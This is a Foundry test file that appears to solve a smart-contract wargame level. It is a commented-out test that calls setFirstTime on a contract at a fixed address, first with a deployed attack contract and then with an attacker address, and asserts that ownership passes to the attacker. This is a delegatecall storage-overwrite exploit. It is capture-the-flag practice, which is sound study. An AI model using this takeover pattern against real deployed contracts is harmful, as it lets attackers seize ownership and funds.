// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Level16} from "../src/Level16.sol";

contract Level16Test is Test {
    address addr = 0x6389AC602Ba4ffed2CAdf16Cf073A25F1727EacC;

    function setUp() public {}

    // function test_Elevator() public {
    //     address alice = makeAddr("alice");
    //     (bool ff, bytes memory data1) = address(addr).call(abi.encodeWithSignature("owner()"));
    //     address oldOwner = abi.decode(data1, (address));
    //     console.log(ff, oldOwner, "old owner");
    //     Level16 l = new Level16();
    //     uint256 a = uint160(address(l));
    //     (bool d,) = address(addr).call(abi.encodeWithSignature("setFirstTime(uint256)", a));
    //     assertTrue(d);
    //     uint256 alice256 = uint160(alice);
    //     (bool e,) = address(addr).call(abi.encodeWithSignature("setFirstTime(uint256)", alice256));
    //     assertTrue(e);
    //     (bool f, bytes memory data) = address(addr).call(abi.encodeWithSignature("owner()"));
    //     assertTrue(f);
    //     address newOwner = abi.decode(data, (address));
    //     console.log(newOwner, "newOwner");
    //     assertEq(alice, newOwner);
    // }
}
